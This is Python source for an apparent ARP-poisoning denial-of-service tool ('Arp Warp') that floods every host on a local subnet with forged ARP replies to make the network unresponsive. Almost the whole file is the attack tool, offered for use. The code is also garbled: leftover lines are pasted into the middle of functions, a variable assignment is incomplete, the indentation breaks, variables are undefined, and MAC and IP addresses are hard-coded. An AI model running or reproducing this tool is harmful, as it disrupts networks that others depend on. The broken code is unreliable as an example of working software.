import argparse
import logging
import ipaddress
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings

from scapy.all import *
from typing import Dict, Union
conf.verb = 0

#   --------------------------------------------------------------------------------------------------------------------
#
#   Arp Warp attack - Continously poison the ARP cache of all hosts on the connected network to make it unresponsive
#
#   Notes
#       * 
#
#   Mitigation
#       * Static ARP table
#
#   --------------------------------------------------------------------------------------------------------------------

banner = """
......_ ........______....... __........ ____....
...../ \.. ____|    \ \ ...../ /___ ____|    \...
..../   \.|  __|     \ \ /\ / /    |  __|     |..
.../ /.\ \| |  |  __/.\      /     | |..|  __/...
../_/...\_\_|..|_|.....\_/\_/.\____|_|..|_|......
"""

# TODO ipv4 only supported?
# todo mac for gateway

class ArpWarp:
    _P_TIMEOUT = 2

    def __init__(self, iface, cidr, s_time, gateway=None):
        print(f"[*] Setting up attacker...")

        self.network_interface = iface
        self.cidr = cidr

        self.my_mac = Ether().src
        self.my_private_ip = get_if_addr(self.network_interface)

        self.arp_poison_interval = s_time

        self.subnet = self.my_private_ip.split(".")[:3]
        self.gateway = gateway or f"{'.'.join(self.subnet)}.1"

        self.host_ips = {host_ip for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
                         host_ip != self.my_private_ip and host_ip != self.gateway}
        print(f"[*] Generated {len(self.host_ips)} possible host targets for subnet {'.'.join(self.subnet)}.x")

        self.abort = False

    def generate_original_cache(self) -> Dict[str, str]:
        gateway = self.subnet
        host_ips =
        while True:
            for host_ip in host_ips:
                arp_packet = ARP(op=2, psrc=ip, hwdst="30:24:78:b7:63:7c", hwsrc=RandMAC(), pdst="192.168.1.1")
                sendp(Ether() / arp_packet, iface=self.network_interface)
                print(host_ip)
            time.sleep(self.arp_poison_interval)
        exit(0)
        subnet = ".".join(self.subnet + ["0"])
        arp_request = ARP(pdst=f"{subnet}/{self.cidr}")
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, iface=self.network_interface)[0]

        for _ in range(3):  # perform several scans
            for element in answered_list:
                h_ip, h_mac = element[1][ARP].psrc, element[1][ARP].hwsrc
                if h_ip != self.my_private_ip and h_ip not in arp_cache:
                    print(f"[+] HOST IS UP {h_ip} -> {h_mac}")
                    arp_cache[h_ip] = h_mac
            time.sleep(5)

        print(f"[*] Finished generating original ARP table...")
        return arp_cache

    def generate_poisoned_cache(self) -> Dict[str, str]:
        """
        Generate a new poisoned cache table where each key has the value of the previous key
        """
        poisoned_table = dict()
        table_size = len(self.original_arp_cache)
        spoofed_values = [list(self.original_arp_cache.values())[i - 1] for i in range(table_size)]

        print(f"[*] Preparing poisoned ARP table...")
        for index, host_ip in enumerate(self.original_arp_cache.keys()):
            poisoned_table[host_ip] = spoofed_values[index]
            print(f"[*] Host {host_ip} original -> {self.original_arp_cache[host_ip]} spoofed -> {poisoned_table[host_ip]}")

        print(f"[*] Poisoned ARP table is ready")
        return poisoned_table

    def poison_arp(self):
        """
        iterate over all spoofed entries, and send each host (inside an inner loop) the
        arp packets of the scrambled entries
        """
        for host_ip in self.host_ips:  # TODO get mac of gateway
            arp_packet = ARP(op=2, psrc=host_ip, hwdst="30:24:78:b7:63:7c", hwsrc=RandMAC(), pdst="192.168.1.1")
            sendp(Ether() / arp_packet, iface=self.network_interface)

    def restore_arp(self):
        """
        restore the arp table to the original values for all network hosts
        """
        for restore_host_ip, restore_host_mac in self.original_arp_cache.items():
            print(f"[*] Restoring for {restore_host_ip}...")

            for target_host_ip, target_host_mac in self.original_arp_cache.items():
                if target_host_ip != restore_host_ip:
                    self.send_arp_packet(iface=self.network_interface,
                                         op=2,
                                         psrc=restore_host_ip,
                                         hwsrc=restore_host_mac,
                                         pdst=target_host_ip,
                                         hwdst=target_host_mac)

    def start_attack(self):
        print(f"[*] Generating original ARP cache for subnet {'.'.join(self.subnet)}.x, this might a minute...")
        gateway = self.subnet
        host_ips = {host_ip for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
                    host_ip != self.my_private_ip and host_ip != self.gateway}
        while True:

                print(host_ip)
            time.sleep(self.arp_poison_interval)

        loop_count = 0
        while not self.abort:
            try:
                loop_count += 1
                self.poison_arp()
                print(f"[*] Finished attack loop -> {loop_count}")
                time.sleep(self.arp_poison_interval)
            except Exception as exc:
                print(f"[!] Exception caught -> {exc}")
                self.abort = True
            except KeyboardInterrupt:
                print(f"[*] User requested to stop...")
                self.abort = True
        print("[*] Restoring arp...")
        self.restore_arp()

    @staticmethod
    def send_arp_packet(iface, await_res=False, **p_params) -> Union[None, scapy.layers.l2.Ether]:
        arp_packet = ARP(**p_params)
        if await_res:
            arp_res = srp1(Ether() / arp_packet, timeout=ArpWarp._P_TIMEOUT, iface=iface)
            return arp_res
        sendp(Ether() / arp_packet, iface=iface)


if __name__ == "__main__":
    print(f"\n{banner}\nWritten by @flashnuke\n{'=' * 49}")
    parser = argparse.ArgumentParser(description=f'Perform an ARP cache poison attack',
                                     usage=f"./{os.path.basename(__file__)} iface")
    parser.add_argument("-i", "--network-interface", dest='iface', type=str, metavar=(""),
                        help="the name of the network interface (from `ifconfig`, i.e -> 'eth0')",
                        required=True)

    parser.add_argument("-m", "--set-mask", dest='mask', type=int, metavar=(""), default=24,
                        help="set the mask range (default -> /24 which means 0-256",
                        required=False)

    parser.add_argument("-s", "--sleep-interval", dest='s_time', type=int, metavar=(""), default=1,
                        help="set the sleep time between each arp poison attempt (default -> 1[sec])",
                        required=False)
    arguments = parser.parse_args()

    warper = ArpWarp(arguments.iface, arguments.mask, arguments.s_time)
    warper.start_attack()

